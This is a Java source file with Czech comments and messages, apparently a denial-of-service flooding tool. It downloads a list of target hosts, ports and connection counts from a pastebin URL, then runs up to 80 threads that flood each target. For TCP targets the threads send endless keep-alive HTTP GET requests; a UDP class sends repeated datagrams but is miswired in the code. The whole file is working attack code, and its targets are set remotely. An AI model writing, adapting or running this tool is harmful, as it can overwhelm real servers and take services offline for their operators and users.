import java.net.*;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.io.*;

class mujUkolUDP implements Runnable {
	String hostname;
	int port;
	int opakovani;
	public mujUkolUDP(String hostname, int port, int pocetOpakovani) {
		this.hostname = hostname;
		this.port = port;
		opakovani = pocetOpakovani;
	}
	public void run() {
		// TODO Auto-generated method stub
		InetAddress addr;
		try {
			addr = InetAddress.getByName(hostname);
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return;
		}
		try (DatagramSocket ds = new DatagramSocket()) {
			byte buffer[] = new byte[100];
			DatagramPacket dp = new DatagramPacket(buffer, buffer.length, addr, port);
			for (int i = 0; i < opakovani; i++)
				ds.send(dp);
		} catch (SocketException e) {
			// TODO Auto-generated catch block
			// e.printStackTrace();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			// e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}


class mojeVlakno extends Thread {
	Socket s;
	public mojeVlakno(Socket s) {
		this.s = s;
	}
	public void run() {
		int pocet, pocetBajtu = 0;
		byte [] buffer = new byte [10000];
		InputStream inp;
		try {
			inp = s.getInputStream();
			while ((pocet = inp.read(buffer))!= -1) {
				pocetBajtu += pocet;
			}
			System.out.println("Server ukoncil  spojeni = vlakno konci");
			s.close();
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			// e.printStackTrace();
			if (s.isClosed()) System.err.println("Konec vlakna, protoze socket je uzavren!");
			System.err.println("Chyba při přečtení socketu!");
		}
		System.out.printf("Prijal jsem  %d bajtu\n", pocetBajtu);
	}
	
}


class mujUkol implements Runnable {
	private String host;
	private int port;
	public mujUkol(String host, int port) {
		this.host = host;
		this.port = port;
	}
	public void run(){
		int pocetPozadavku = 0, pocetBajtu = 0;
		try {
			Socket s = new Socket(host, port);
			System.out.println("Pripojeni OK");
			mojeVlakno v = new mojeVlakno(s);
			v.start();
			OutputStream outp = s.getOutputStream();
			byte [] request = ("GET / HTTP/1.1\r\n"
					+ "Host: " + host + "\r\n"
					+ "Connection:keep-alive\r\n\r\n").getBytes();
			while (s.isConnected()) {
				outp.write(request);
				outp.flush();
				pocetPozadavku++;
				pocetBajtu += request.length;
			}
			System.out.println("main() > socket je closed, koncime...");
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			//System.err.println("main:UnknownException");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			//System.err.println("main:IOException");
		}
		System.out.printf("Odeslano %d pozadavku, %d bajtu\n", pocetPozadavku, pocetBajtu);
	}
}


public class Hlavni {

	public static void main(String[] args) throws IOException {
		if (args.length < 1) {
			System.out.println("Nebyl nalezen žádný parametr URL!");
			return;
		}
		try {
			URL url = new URL("https://pastebin.com/raw/vF3UE9Pq");
			URLConnection con = url.openConnection();
			Scanner s = new Scanner(con.getInputStream());
			ExecutorService executor = Executors.newFixedThreadPool(80); 
			while (s.hasNext()) {
				String line = s.nextLine();
				String[] arr = line.split(" ");
				if (!(arr.length == 5)) {
					System.err.println("Špatný formát adresy: " + line);
				}
				String host = arr[0];
				int port = Integer.parseInt(arr[1]);
				int parallelConection = Integer.parseInt(arr[2]);
				int requestCount = Integer.parseInt(arr[3]);
				String protocol = arr[4];
				
				if (protocol.equals("TCP")) {
					mujUkol tcp = new mujUkol(host, port);
					for (int i = 0; i < parallelConection; i++) {
						executor.execute(tcp);
						System.out.println("TCP ukol: " + i);
					}
				}
				else if (protocol.equals("UDP")) {
					mujUkol udp = new mujUkol(host, port);
					for (int i = 0; i < parallelConection; i++) {
						executor.execute(udp);
						System.out.println("UDP ukol: " + i);
					}
				}
				else
					System.err.println("Nevalidní typ protokolu: " + protocol);
			}
			executor.shutdown();
			
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
